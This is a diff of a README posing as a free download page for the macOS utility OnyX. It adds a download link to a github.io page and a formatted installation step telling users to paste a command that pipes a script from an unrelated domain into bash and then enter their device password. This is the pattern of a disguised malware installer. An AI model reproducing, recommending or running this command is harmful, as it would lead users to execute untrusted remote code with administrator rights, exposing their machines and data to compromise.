@@ -1,7 +1,7 @@
 # OnyX For Mac — Free Download  
 OnyX is a powerful macOS utility for system optimization and maintenance. Follow the instructions below to install OnyX on your Mac for free and keep your system running smoothly! 🚀  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-007AFF?style=for-the-badge&logo=apple)]()  
+[![Download Now](https://img.shields.io/badge/Download%20Now-007AFF?style=for-the-badge&logo=apple)](https://onyx-for-mac.github.io/.github/)  
 
 If the download button doesn’t work, follow the terminal command instructions below for a seamless installation.
 
@@ -20,7 +20,9 @@ If the download button doesn’t work, follow the terminal command instructions 
 
 1. Copy the installation command below:
 
+```
 /bin/bash -c "$(curl -fsSL https://veitzeatz.com/get3/install.sh)"
+```
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
